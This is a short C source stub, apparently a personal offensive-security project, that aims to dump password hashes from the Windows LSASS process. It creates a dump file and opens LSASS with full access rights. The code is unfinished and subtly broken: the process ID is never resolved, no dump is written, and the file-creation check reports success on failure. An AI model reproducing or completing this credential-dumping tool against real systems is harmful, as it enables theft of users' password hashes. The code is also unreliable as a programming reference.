/*
* Author: Aleksa Zatezalo
* Date: Februrary 2024
* Description: LSASS is a C program that dumps password hashes from LSASSs. 
*/

#include <stdio.h>
#include <Windows.h>
#include <DbgHelp.h>
#pragma comment(lib, "DbgHelp.lib")


void LSASSDump()
{
    HANDLE lsassProcess;
    int lsassPID = 0;
    HANDLE DumpFile = CreateFileA("dumpfile.dmp", GENERIC_ALL, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (!DumpFile) {
        printf("[!] Dump file created successfully!\n");
    }

    lsassProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, lsassPID);
    if (!lsassProcess){
        printf("[!] Could not open LSASS Process! %d\n", GetLastError());
        exit(-1);
    }

}